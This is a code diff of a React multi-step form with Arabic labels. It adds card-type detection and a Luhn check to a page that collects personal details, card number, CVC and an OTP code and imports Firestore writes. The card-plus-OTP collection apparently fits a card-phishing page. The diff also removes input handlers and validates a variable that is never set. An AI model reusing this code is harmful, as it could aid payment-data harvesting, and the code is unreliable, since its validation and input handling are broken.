@@ -6,6 +6,7 @@ import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/componen
 import { Input } from "@/components/ui/input"
 import { initializeApp } from "firebase/app"
 import { getFirestore, doc, setDoc } from "firebase/firestore"
+import { Check, X } from "lucide-react"
 
 // Your Firebase configuration
 const firebaseConfig = {
@@ -42,7 +43,51 @@ type FormData = {
     },
     otp: { otp: string }
 }
+
+type CardType = "Visa" | "Mastercard" | "American Express" | "Discover" | "Unknown"
+
+const cardPatterns: { [key in Exclude<CardType, "Unknown">]: RegExp } = {
+  Visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
+  Mastercard: /^5[1-5][0-9]{14}$/,
+  "American Express": /^3[47][0-9]{13}$/,
+  Discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
+}
+
+const getCardType = (cardNumber: string): CardType => {
+  for (const [type, pattern] of Object.entries(cardPatterns)) {
+    if (pattern.test(cardNumber)) {
+      return type as CardType
+    }
+  }
+  return "Unknown"
+}
+
+const isValidCardNumber = (cardNumber: string): boolean => {
+  const digits = cardNumber.replace(/\D/g, "")
+  let sum = 0
+  let isEven = false
+
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let digit = parseInt(digits[i], 10)
+
+    if (isEven) {
+      digit *= 2
+      if (digit > 9) {
+        digit -= 9
+      }
+    }
+
+    sum += digit
+    isEven = !isEven
+  }
+
+  return sum % 10 === 0
+}
+
 export default function Component() {
+    const [cardNumber, setCardNumber] = useState("")
+    const [cardType, setCardType] = useState<CardType>("Unknown")
+    const [isValid, setIsValid] = useState<boolean | null>(null)
     const [step, setStep] = useState(1)
     const [formData, setFormData] = useState<FormData>({
         personalInfo: { name: "", email: "", phone: "", password: "" },
@@ -50,8 +95,19 @@ export default function Component() {
         payment: { cardNumber: "", expiry: "", cvc: "" },
         otp: { otp: '' }
     })
-
+    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+        const input = e.target.value.replace(/\D/g, "")
+        updateFormData("payment","cardNumber",input)
+        setCardType(getCardType(input))
+        setIsValid(null)
+      }
+    
+      const handleValidate = () => {
+        setIsValid(isValidCardNumber(cardNumber))
+      }
+    
     const updateFormData = (step: keyof FormData, field: string, value: string) => {
+ 
         setFormData((prev) => ({
             ...prev,
             [step]: {
@@ -75,7 +131,6 @@ export default function Component() {
                     id="name"
                     placeholder="محمد أحمد"
                     defaultValue={formData.personalInfo.name}
-                    onChange={(e) => updateFormData("personalInfo", "name", e.target.value)}
                 />
             </div>
             <div className="space-y-2">
@@ -85,7 +140,6 @@ export default function Component() {
                     type="email"
                     placeholder="mohammed@example.com"
                     defaultValue={formData.personalInfo.email}
-                    onChange={(e) => updateFormData("personalInfo", "email", e.target.value)}
                 />
             </div>
             <div className="space-y-2">
@@ -95,7 +149,7 @@ export default function Component() {
                     type="tel"
                     placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
                     defaultValue={formData.personalInfo.phone}
-                    onChange={(e) => updateFormData("personalInfo", "phone", e.target.value)}
+                 
                 />
             </div>
         </>
@@ -106,6 +160,7 @@ export default function Component() {
             <div className="space-y-2">
                 <label htmlFor="street">عنوان الشارع</label>
                 <Input
+                    type="text"
                     id="street"
                     placeholder="١٢٣ شارع الرئيسي"
                     defaultValue={formData.address.street}
@@ -116,6 +171,8 @@ export default function Component() {
                 <label htmlFor="city">المدينة</label>
                 <Input
                     id="city"
+                    type="text"
+
                     placeholder="الرياض"
                     defaultValue={formData.address.city}
                     onChange={(e) => updateFormData("address", "city", e.target.value)}
@@ -125,6 +182,7 @@ export default function Component() {
                 <label htmlFor="state">المنطقة</label>
                 <Input
                     id="state"
+                    type="text"
                     placeholder="الرياض"
                     defaultValue={formData.address.state}
                     onChange={(e) => updateFormData("address", "state", e.target.value)}
@@ -133,6 +191,7 @@ export default function Component() {
             <div className="space-y-2">
                 <label htmlFor="zipCode">الرمز البريدي</label>
                 <Input
+                    type="number"
                     id="zipCode"
                     placeholder="١٢٣٤٥"
                     defaultValue={formData.address.zipCode}
@@ -147,6 +206,7 @@ export default function Component() {
                 <label htmlFor="otp">  رمز OTP</label>
                 <Input
                     id="otp"
+                    type="number"
                     placeholder=" OTP ادخل الرمز المرسل "
                     defaultValue={formData.otp.otp}
                     onChange={(e) => updateFormData("otp", "otp", e.target.value)}
@@ -165,12 +225,14 @@ export default function Component() {
             <div className="space-y-2">
                 <label htmlFor="cardNumber">رقم البطاقة</label>
                 <Input
-                    id="cardNumber"
-                    placeholder="١٢٣٤ ٥٦٧٨ ٩٠١٢ ٣٤٥٦"
-                    defaultValue={formData.payment.cardNumber}
-                    onChange={(e) => updateFormData("payment", "cardNumber", e.target.value)}
-                    autoFocus
-                />
+            id="cardNumber"
+                            placeholder="١٢٣٤ ٥٦٧٨ ٩٠١٢ ٣٤٥٦"
+
+            defaultValue={formData.payment.cardNumber}
+            onChange={handleInputChange}
+            maxLength={19}
+          />
+              
             </div>
             <div className="space-y-2">
                 <label htmlFor="expiry">تاريخ الانتهاء</label>
@@ -188,8 +250,16 @@ export default function Component() {
                     placeholder="١٢٣"
                     defaultValue={formData.payment.cvc}
                     onChange={(e) => updateFormData("payment", "cvc", e.target.value)}
-                />
+                />     
+        <img src="./images/ads.png" alt="pyment" height={70}/>
+                   {isValid !== null && (
+                    <div className={`flex items-center gap-2 ${isValid ? "text-green-500" : "text-red-500"}`}>
+                      {isValid ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
+                      <span>{isValid ? "" : "رقم البطاقة غير صحيح"}</span>
+                    </div>
+                  )}
             </div>
+    
         </>
     )
 
